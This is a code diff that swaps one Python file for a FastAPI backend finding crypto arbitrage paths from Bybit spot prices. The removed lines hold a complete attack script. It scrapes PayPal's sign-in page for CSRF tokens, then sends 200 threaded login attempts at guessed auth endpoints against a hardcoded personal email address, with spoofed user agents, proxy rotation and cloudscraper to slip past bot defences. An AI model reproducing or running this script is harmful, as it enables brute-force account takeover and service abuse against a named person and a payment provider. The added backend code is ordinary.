@@ -1,188 +1,498 @@
-import requests
-import cloudscraper
-from concurrent.futures import ThreadPoolExecutor
-from faker import Faker
-import time
-import random
-import logging
-import re
+"""
+FastAPI Backend for Manual Crypto Arbitrage System (v0)
+Fetches all spot pairs from Bybit, builds a coin graph, and finds arbitrage opportunities.
+Run: uvicorn server:app --reload
+"""
 
-# Set up detailed logging to track requests, responses, and headers
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', filename='paypal_endpoint_hits.log')
+import asyncio
+import httpx
+from typing import Optional, Dict, List, Set, Tuple
+from enum import Enum
+from dataclasses import dataclass
+from collections import defaultdict
+from datetime import datetime
 
-# Frontend URL for initial session setup
-FRONTEND_URL = "https://www.paypal.com/signin"
+from fastapi import FastAPI, HTTPException
+from fastapi.middleware.cors import CORSMiddleware
+from pydantic import BaseModel, Field, validator
 
-# Candidate endpoints for PayPal user login (based on observed patterns)
-CANDIDATE_ENDPOINTS = [
-    "https://www.paypal.com/signin/authorize",
-    "https://api.paypal.com/v1/auth/login",
-    "https://www.paypal.com/webapps/auth/loginsubmit",
-    "https://www.paypal.com/authflow/password-login",
-]
+# ============================================================================
+# Data Models and Enums
+# ============================================================================
 
-# Number of threads/requests (adjusted for testing)
-THREAD_COUNT = 50
-TOTAL_REQUESTS = 200
+class ArbitrageMode(str, Enum):
+    """Mode for arbitrage path finding."""
+    START_ONLY = "START_ONLY"
+    POPULAR_END = "POPULAR_END"
+    BOTH = "BOTH"
 
-# Fake user agent generator
-fake = Faker()
 
-# List of proxies (add your own for IP rotation if needed)
-PROXIES = [
-    # Example format: {"http": "http://proxy1:port", "https": "http://proxy1:port"},
-]
+class RiskLevel(str, Enum):
+    """Risk level based on coin popularity."""
+    SAFE = "SAFE"
+    MEDIUM = "MEDIUM"
 
-# Input fields for PayPal email and password
-PAYPAL_EMAIL = "ogorchukwuf@gmail.com"
-PAYPAL_PASSWORD = "wrongpassword123"
 
-# Hardcoded headers to mimic PayPal frontend browser request
-def get_headers(referer="https://www.paypal.com/signin"):
-    return {
-        "User-Agent": fake.user_agent(),
-        "Accept": "application/json, text/javascript, */*; q=0.01",
-        "Content-Type": "application/json; charset=UTF-8",
-        "Referer": referer,
-        "Origin": "https://www.paypal.com",
-        "Accept-Language": "en-US,en;q=0.9",
-        "Accept-Encoding": "gzip, deflate, br",
-        "X-Requested-With": "XMLHttpRequest",
-        "X-XHR-AJAX": "true",
-        "Connection": "keep-alive",
-    }
+class ArbitrageRequest(BaseModel):
+    """Request model for arbitrage calculation."""
+    start_coin: str = Field(..., min_length=1, max_length=20)
+    start_amount: float = Field(..., gt=0)
+    mode: ArbitrageMode
 
-# Hardcoded payload for login attempt (mimics user authentication flow)
-def get_payload(correlation_id=""):
-    return {
-        "username": PAYPAL_EMAIL,
-        "password": PAYPAL_PASSWORD,
-        "nonce": str(random.randint(100000, 999999)),
-        "correlationId": correlation_id if correlation_id else f"web_{int(time.time())}",
-        "flowId": "login",  # Often used in PayPal login flows
-        "intent": "login",
-    }
+    @validator('start_coin')
+    def validate_start_coin(cls, v):
+        return v.upper()
 
-# Function to extract session data and potential login endpoints from frontend response
-def extract_session_data(session, url=FRONTEND_URL):
+
+class PathOpportunity(BaseModel):
+    """Single arbitrage path opportunity."""
+    path: List[str]
+    start_amount: float
+    end_amount: float
+    profit_percent: float
+    end_coin: str
+    risk: RiskLevel
+
+
+class ArbitrageResponse(BaseModel):
+    """Response model for arbitrage opportunities."""
+    start_coin: str
+    start_amount: float
+    mode: ArbitrageMode
+    opportunities: List[PathOpportunity]
+    total_count: int
+    fetch_timestamp: str
+
+
+# ============================================================================
+# Coin Graph and Graph Utilities
+# ============================================================================
+
+@dataclass
+class Edge:
+    """Represents an edge in the coin graph (trading pair)."""
+    target: str
+    price: float
+
+
+class CoinGraph:
+    """
+    Graph representation where:
+    - Nodes are coins
+    - Edges are spot pairs with prices
+    - Both directions are included (A→B at price P, B→A at price 1/P)
+    """
+
+    def __init__(self):
+        self.graph: Dict[str, List[Edge]] = defaultdict(list)
+        self.all_coins: Set[str] = set()
+
+    def add_edge(self, source: str, target: str, price: float):
+        """Add directed edge from source to target with given price."""
+        self.graph[source].append(Edge(target=target, price=price))
+        self.all_coins.add(source)
+        self.all_coins.add(target)
+
+    def add_pair(self, coin1: str, coin2: str, price: float):
+        """
+        Add bidirectional pair (both directions).
+        coin1 → coin2 at price P
+        coin2 → coin1 at price 1/P
+        """
+        self.add_edge(coin1, coin2, price)
+        if price > 0:
+            self.add_edge(coin2, coin1, 1 / price)
+
+    def get_neighbors(self, coin: str) -> List[Edge]:
+        """Get all neighbors of a coin."""
+        return self.graph.get(coin, [])
+
+    def coins_count(self) -> int:
+        """Return total number of coins in graph."""
+        return len(self.all_coins)
+
+    def pairs_count(self) -> int:
+        """Return total number of edges in graph."""
+        return sum(len(neighbors) for neighbors in self.graph.values())
+
+
+# ============================================================================
+# Bybit API Integration
+# ============================================================================
+
+BYBIT_SPOT_API_URL = "https://api.bybit.com/v5/market/tickers"
+
+
+async def fetch_bybit_pairs() -> Dict[str, float]:
+    """
+    Fetch all spot pairs from Bybit.
+    Returns dict: {pair_name: price} e.g., {"BTCUSDT": 45000.0}
+    """
     try:
-        # Simulate initial browser visit to signin page
-        init_response = session.get(url, headers=get_headers(), timeout=10)
-        cookies = dict(session.cookies)
+        async with httpx.AsyncClient(timeout=30.0) as client:
+            params = {
+                "category": "spot",
+                "limit": 1000,
+            }
+            
+            all_tickers = []
+            cursor = ""
+            
+            while True:
+                if cursor:
+                    params["cursor"] = cursor
+                
+                response = await client.get(BYBIT_SPOT_API_URL, params=params)
+                response.raise_for_status()
+                data = response.json()
+                
+                if data.get("retCode") != 0:
+                    raise HTTPException(
+                        status_code=500,
+                        detail=f"Bybit API error: {data.get('retMsg', 'Unknown error')}"
+                    )
+                
+                tickers = data.get("result", {}).get("list", [])
+                if not tickers:
+                    break
+                
+                all_tickers.extend(tickers)
+                
+                # Check if there are more pages
+                next_cursor = data.get("result", {}).get("nextPageCursor", "")
+                if not next_cursor:
+                    break
+                cursor = next_cursor
+            
+            # Convert to dict: symbol → price
+            pairs = {}
+            for ticker in all_tickers:
+                symbol = ticker.get("symbol", "")
+                price_str = ticker.get("lastPrice", "0")
+                
+                try:
+                    price = float(price_str)
+                    if price > 0:
+                        pairs[symbol] = price
+                except ValueError:
+                    continue
+            
+            return pairs
+    
+    except httpx.HTTPError as e:
+        raise HTTPException(
+            status_code=500,
+            detail=f"Failed to fetch Bybit data: {str(e)}"
+        )
+
+
+def extract_coins_from_pair(pair: str) -> Tuple[Optional[str], Optional[str]]:
+    """
+    Extract coin1 and coin2 from pair name.
+    E.g., "BTCUSDT" → ("BTC", "USDT")
+    Uses common stablecoin/fiat suffixes to determine split.
+    """
+    # Common stablecoin/quote currency suffixes (longest first)
+    suffixes = ["USDT", "USDC", "BUSD", "TUSD", "SUSD", "DAI", "USDE", "FDUSD",
+                "USD", "USDK", "USDJ", "DOGE", "BTC", "ETH", "BNB", "SOL"]
+    
+    pair_upper = pair.upper()
+    
+    for suffix in suffixes:
+        if pair_upper.endswith(suffix) and len(pair_upper) > len(suffix):
+            coin1 = pair_upper[:-len(suffix)]
+            coin2 = suffix
+            return coin1, coin2
+    
+    return None, None
+
+
+def build_graph_from_pairs(pairs: Dict[str, float]) -> CoinGraph:
+    """
+    Build coin graph from Bybit pairs.
+    Filter out pairs where coin extraction fails.
+    """
+    graph = CoinGraph()
+    
+    for pair, price in pairs.items():
+        coin1, coin2 = extract_coins_from_pair(pair)
         
-        # Extract CSRF token from cookies or headers
-        csrf_token = cookies.get("csrf", "") or cookies.get("X-CSRF-TOKEN", "")
-        if not csrf_token:
-            csrf_token = init_response.headers.get("X-CSRF-Token", "")
+        if coin1 and coin2:
+            graph.add_pair(coin1, coin2, price)
+    
+    return graph
+
+
+# ============================================================================
+# DFS Path Finding Algorithm
+# ============================================================================
+
+POPULAR_COINS = {"USDT", "USDC", "BTC", "ETH", "BNB", "SOL", "XRP", "TRX", "DOGE"}
+
+
+def get_risk_level(coin: str) -> RiskLevel:
+    """Determine risk level based on coin popularity."""
+    return RiskLevel.SAFE if coin.upper() in POPULAR_COINS else RiskLevel.MEDIUM
+
+
+def find_paths_dfs(
+    graph: CoinGraph,
+    start_coin: str,
+    mode: ArbitrageMode,
+    max_depth: int = 4,
+    max_paths: int = 500
+) -> List[List[str]]:
+    """
+    Find arbitrage paths using DFS.
+    - max_depth: maximum path length (3-4 for triangular/quadrangular paths)
+    - max_paths: limit number of paths to avoid timeout
+    """
+    start_coin = start_coin.upper()
+    paths: List[List[str]] = []
+    visited_set = set()
+
+    def dfs(current: str, path: List[str], depth: int):
+        """Recursively find paths using DFS."""
+        if len(paths) >= max_paths:
+            return
+
+        # Check path validity based on mode
+        if len(path) >= 3:
+            end_coin = path[-1]
+            
+            is_valid = False
+            if mode == ArbitrageMode.START_ONLY:
+                is_valid = end_coin == start_coin
+            elif mode == ArbitrageMode.POPULAR_END:
+                is_valid = end_coin.upper() in POPULAR_COINS
+            else:  # BOTH
+                is_valid = True
+            
+            if is_valid:
+                # Convert to tuple for hashing (avoid duplicate paths)
+                path_tuple = tuple(path)
+                if path_tuple not in visited_set:
+                    visited_set.add(path_tuple)
+                    paths.append(path[:])
+
+        # Continue DFS if depth allows
+        if depth < max_depth:
+            for edge in graph.get_neighbors(current):
+                # Allow revisiting coins but avoid immediate loops
+                if len(path) <= 1 or edge.target != path[-2]:
+                    path.append(edge.target)
+                    dfs(edge.target, path, depth + 1)
+                    path.pop()
+
+    dfs(start_coin, [start_coin], 0)
+    return paths
+
+
+# ============================================================================
+# Profit Calculation
+# ============================================================================
+
+TRADING_FEE = 0.001  # 0.1% per trade
+
+
+def calculate_profit(
+    graph: CoinGraph,
+    path: List[str],
+    start_amount: float
+) -> Tuple[float, float]:
+    """
+    Calculate end amount and profit percentage for a path.
+    Applies 0.1% trading fee at each leg.
+    Returns (end_amount, profit_percent)
+    """
+    amount = start_amount
+    
+    for i in range(len(path) - 1):
+        source = path[i].upper()
+        target = path[i + 1].upper()
         
-        # Extract correlation ID or other tokens from response body (HTML/JS)
-        correlation_id = ""
-        body_match = re.search(r'correlationId\s*[:=]\s*[\'"]?([^\'";]+)', init_response.text)
-        if body_match:
-            correlation_id = body_match.group(1)
-        else:
-            body_tokens = re.findall(r'(?:csrf|token|id)[^>]*value=[\'"]?([^\'" >]+)', init_response.text)
-            correlation_id = body_tokens[0] if body_tokens else ""
+        # Find edge price
+        edges = graph.get_neighbors(source)
+        price = None
+        for edge in edges:
+            if edge.target == target:
+                price = edge.price
+                break
         
-        # Attempt to extract login endpoint or form action from HTML
-        login_endpoint = ""
-        form_action_match = re.search(r'form\s+[^>]*action=[\'"]?([^\'" >]+)', init_response.text)
-        if form_action_match:
-            login_endpoint = form_action_match.group(1)
-            if not login_endpoint.startswith("http"):
-                login_endpoint = "https://www.paypal.com" + login_endpoint if login_endpoint.startswith("/") else "https://www.paypal.com/" + login_endpoint
-        else:
-            api_calls = re.findall(r'url\s*:\s*[\'"]?([^\'" >]+)', init_response.text)
-            for call in api_calls:
-                if "login" in call.lower() or "auth" in call.lower():
-                    login_endpoint = call if call.startswith("http") else "https://www.paypal.com" + call
+        if price is None:
+            return 0, 0
         
-        logging.info(f"Session Cookies: {cookies}")
-        logging.info(f"Response Headers: {dict(init_response.headers)}")
-        logging.info(f"Extracted CSRF Token: {csrf_token if csrf_token else 'Not found'}")
-        logging.info(f"Extracted Correlation ID: {correlation_id if correlation_id else 'Generated'}")
-        logging.info(f"Extracted Login Endpoint: {login_endpoint if login_endpoint else 'Not found, using candidates'}")
+        # Apply trading fee and price conversion
+        amount = amount * (1 - TRADING_FEE) * price
+    
+    profit_percent = ((amount - start_amount) / start_amount) * 100
+    return amount, profit_percent
+
+
+# ============================================================================
+# FastAPI Application
+# ============================================================================
+
+app = FastAPI(
+    title="Crypto Arbitrage Backend",
+    description="Manual crypto arbitrage system using Bybit spot pairs",
+    version="1.0.0"
+)
+
+# Add CORS middleware
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
+
+# Global graph cache
+_graph_cache: Optional[CoinGraph] = None
+_graph_timestamp: Optional[str] = None
+
+
+async def get_or_refresh_graph() -> Tuple[CoinGraph, str]:
+    """Get cached graph or refresh from Bybit."""
+    global _graph_cache, _graph_timestamp
+    
+    if _graph_cache is None:
+        pairs = await fetch_bybit_pairs()
+        _graph_cache = build_graph_from_pairs(pairs)
+        _graph_timestamp = datetime.utcnow().isoformat()
+    
+    return _graph_cache, _graph_timestamp
+
+
+@app.get("/health")
+async def health_check():
+    """Health check endpoint."""
+    return {"status": "healthy", "service": "crypto-arbitrage-backend"}
+
+
+@app.get("/graph/info")
+async def graph_info():
+    """Get information about the current coin graph."""
+    graph, timestamp = await get_or_refresh_graph()
+    return {
+        "coins_count": graph.coins_count(),
+        "pairs_count": graph.pairs_count(),
+        "popular_coins": list(POPULAR_COINS),
+        "fetch_timestamp": timestamp
+    }
+
+
+@app.post("/arbitrage/calculate", response_model=ArbitrageResponse)
+async def calculate_arbitrage(request: ArbitrageRequest) -> ArbitrageResponse:
+    """
+    Calculate arbitrage opportunities.
+    
+    POST /arbitrage/calculate
+    {
+        "start_coin": "USDT",
+        "start_amount": 1000,
+        "mode": "START_ONLY|POPULAR_END|BOTH"
+    }
+    """
+    try:
+        # Get or refresh graph
+        graph, fetch_timestamp = await get_or_refresh_graph()
+        
+        # Validate start coin exists
+        start_coin_upper = request.start_coin.upper()
+        if start_coin_upper not in graph.all_coins:
+            raise HTTPException(
+                status_code=400,
+                detail=f"Coin '{request.start_coin}' not found in Bybit spot pairs"
+            )
+        
+        # Find paths
+        paths = find_paths_dfs(
+            graph,
+            request.start_coin,
+            request.mode,
+            max_depth=4,
+            max_paths=500
+        )
+        
+        # Calculate profits and create opportunities
+        opportunities: List[PathOpportunity] = []
+        
+        for path in paths:
+            end_amount, profit_percent = calculate_profit(
+                graph,
+                path,
+                request.start_amount
+            )
+            
+            # Only include profitable paths
+            if end_amount > 0:
+                opportunity = PathOpportunity(
+                    path=path,
+                    start_amount=request.start_amount,
+                    end_amount=round(end_amount, 8),
+                    profit_percent=round(profit_percent, 6),
+                    end_coin=path[-1],
+                    risk=get_risk_level(path[-1])
+                )
+                opportunities.append(opportunity)
+        
+        # Sort by profit percentage (highest first)
+        opportunities.sort(key=lambda x: x.profit_percent, reverse=True)
+        
+        return ArbitrageResponse(
+            start_coin=start_coin_upper,
+            start_amount=request.start_amount,
+            mode=request.mode,
+            opportunities=opportunities,
+            total_count=len(opportunities),
+            fetch_timestamp=fetch_timestamp
+        )
+    
+    except HTTPException:
+        raise
+    except Exception as e:
+        raise HTTPException(
+            status_code=500,
+            detail=f"Error calculating arbitrage: {str(e)}"
+        )
+
+
+@app.post("/arbitrage/refresh")
+async def refresh_graph():
+    """Manually refresh the coin graph from Bybit."""
+    global _graph_cache, _graph_timestamp
+    
+    try:
+        pairs = await fetch_bybit_pairs()
+        _graph_cache = build_graph_from_pairs(pairs)
+        _graph_timestamp = datetime.utcnow().isoformat()
+        
         return {
-            "csrf_token": csrf_token,
-            "correlation_id": correlation_id,
-            "cookies": cookies,
-            "login_endpoint": login_endpoint
+            "status": "success",
+            "message": "Graph refreshed",
+            "coins_count": _graph_cache.coins_count(),
+            "pairs_count": _graph_cache.pairs_count(),
+            "fetch_timestamp": _graph_timestamp
         }
     except Exception as e:
-        logging.error(f"Failed to extract session data: {str(e)}")
-        return {}
+        raise HTTPException(
+            status_code=500,
+            detail=f"Failed to refresh graph: {str(e)}"
+        )
 
-# Function to send a single request using session data
-def send_request(request_id, session, scraper, target_url, session_data):
-    try:
-        proxy = random.choice(PROXIES) if PROXIES else None
-        headers = get_headers()
-        payload = get_payload(session_data.get("correlation_id", ""))
-        
-        # Add extracted tokens to headers if available
-        if session_data.get("csrf_token"):
-            headers["X-CSRF-Token"] = session_data["csrf_token"]
-        headers["X-Correlation-ID"] = payload["correlationId"]
-        
-        try:
-            response = session.post(target_url, headers=headers, json=payload, proxies=proxy, timeout=5)
-        except requests.exceptions.RequestException:
-            response = scraper.post(target_url, headers=headers, json=payload, proxies=proxy, timeout=5)
-        
-        logging.info(f"Request {request_id} to {target_url} - Status Code: {response.status_code}")
-        logging.info(f"Request {request_id} - Request Headers: {headers}")
-        logging.info(f"Request {request_id} - Request Payload: {payload}")
-        logging.info(f"Request {request_id} - Response Headers: {dict(response.headers)}")
-        logging.info(f"Request {request_id} - Response Body: {response.text[:500]}...")
-        print(f"Request {request_id} to {target_url} - Status: {response.status_code}")
-        return response.status_code
-    
-    except requests.exceptions.RequestException as e:
-        logging.error(f"Request {request_id} to {target_url} failed: {str(e)}")
-        print(f"Request {request_id} failed: {str(e)}")
-        return None
 
-# Main function to handle concurrent requests
-def hit_endpoint():
-    request_counter = 0
-    successful_requests = 0
-    rate_limit_hits = 0
-    
-    session = requests.Session()
-    scraper = cloudscraper.create_scraper(sess=session)
-    
-    # Extract session data from frontend
-    session_data = extract_session_data(session)
-    
-    # Determine target URL: use extracted endpoint if available, otherwise try candidates
-    target_urls = []
-    if session_data.get("login_endpoint"):
-        target_urls.append(session_data["login_endpoint"])
-    target_urls.extend(CANDIDATE_ENDPOINTS)
-    
-    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
-        futures = []
-        requests_per_url = TOTAL_REQUESTS // len(target_urls) if TOTAL_REQUESTS >= len(target_urls) else 1
-        for target_url in target_urls:
-            print(f"Targeting endpoint: {target_url}")
-            logging.info(f"Targeting endpoint: {target_url}")
-            for i in range(requests_per_url):
-                request_counter += 1
-                futures.append(executor.submit(send_request, request_counter, session, scraper, target_url, session_data))
-                time.sleep(random.uniform(0.1, 0.3))
-        
-        for future in futures:
-            status_code = future.result()
-            if status_code:
-                successful_requests += 1
-                if status_code == 429:
-                    rate_limit_hits += 1
-    
-    logging.info(f"Total Requests: {request_counter}, Successful: {successful_requests}, Rate Limited: {rate_limit_hits}")
-    print(f"Summary - Total: {request_counter}, Success: {successful_requests}, Rate Limited: {rate_limit_hits}")
+# ============================================================================
+# Entry Point
+# ============================================================================
 
 if __name__ == "__main__":
-    print(f"Starting attack with {TOTAL_REQUESTS} requests using {THREAD_COUNT} threads across multiple endpoints...")
-    print(f"Targeting PayPal account: {PAYPAL_EMAIL}")
-    hit_endpoint()
-    print("Attack completed. Check 'paypal_endpoint_hits.log' for details.")
+    import uvicorn
+    uvicorn.run(
+        app,
+        host="0.0.0.0",
+        port=8000,
+        reload=True
+                    )
+    
